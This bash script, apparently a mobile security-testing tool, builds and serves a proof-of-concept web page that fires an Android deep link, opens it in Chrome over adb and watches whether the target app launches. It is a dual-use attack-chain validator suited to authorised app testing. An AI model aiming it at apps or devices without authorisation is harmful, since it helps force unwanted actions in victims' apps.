#!/bin/bash
# Deep Link BROWSABLE Chain Validation
# Tests if a deep link can be triggered from a web page (full attack chain)
# Usage: ./deeplink_browsable_chain_test.sh <serial> <deep_link_url> <host_ip> [port]
#
# Example:
#   ./deeplink_browsable_chain_test.sh 3da73143 "barcelona://create?text=pwned" 192.168.1.8 8889
#
# What it does:
# 1. Creates a PoC HTML page with the deep link
# 2. Serves it via Python HTTP server
# 3. Opens it in Chrome on the device
# 4. Prints instructions to tap the link
# 5. Monitors if the target app opens

SERIAL="${1:?Usage: $0 <serial> <deep_link_url> <host_ip> [port]}"
DEEPLINK="${2:?Provide deep link URL}"
HOST_IP="${3:?Provide host IP reachable from device}"
PORT="${4:-8889}"
WORKDIR=$(mktemp -d)

# Create PoC HTML
cat > "$WORKDIR/poc.html" <<EOF
<!DOCTYPE html>
<html>
<head><title>PoC - Deep Link Chain Test</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial;text-align:center;padding:20px;background:#1a1a2e;color:white;}
.btn{display:inline-block;padding:15px 30px;background:#e94560;color:white;text-decoration:none;border-radius:8px;font-size:18px;margin:20px;}</style>
</head>
<body>
<h1>Deep Link Chain PoC</h1>
<p>Tap below to trigger deep link:</p>
<a class="btn" href="${DEEPLINK}">Trigger Deep Link</a>
<p style="font-size:12px;color:#666;">Target: ${DEEPLINK}</p>
</body>
</html>
EOF

echo "[*] PoC HTML created at $WORKDIR/poc.html"
echo "[*] Starting HTTP server on port $PORT..."

# Start server in background
cd "$WORKDIR"
python3 -c "
import http.server, socketserver
handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(('0.0.0.0', $PORT), handler) as httpd:
    httpd.serve_forever()
" &
SERVER_PID=$!
sleep 2

echo "[*] Opening in Chrome on device..."
adb -s "$SERIAL" shell am start -a android.intent.action.VIEW \
    -d "http://${HOST_IP}:${PORT}/poc.html" \
    -n com.android.chrome/com.google.android.apps.chrome.Main

echo ""
echo "[!] TAP THE LINK ON THE DEVICE"
echo "[*] Monitoring for app switch..."
echo ""

# Monitor for 30 seconds
for i in $(seq 1 15); do
    sleep 2
    TOP=$(adb -s "$SERIAL" shell dumpsys activity activities 2>/dev/null | grep "topResumedActivity" | head -1)
    if echo "$TOP" | grep -v "chrome" | grep -q "Activity"; then
        echo "[+] APP SWITCHED! Deep link triggered from web."
        echo "    $TOP"
        echo ""
        # Dump UI to see what opened
        adb -s "$SERIAL" shell uiautomator dump /sdcard/chain_test.xml 2>/dev/null
        adb -s "$SERIAL" shell cat /sdcard/chain_test.xml 2>/dev/null | grep -oE 'text="[^"]*"' | grep -v 'text=""' | head -10
        break
    fi
done

# Cleanup
kill $SERVER_PID 2>/dev/null
echo ""
echo "[*] Done. PoC at: $WORKDIR/poc.html"
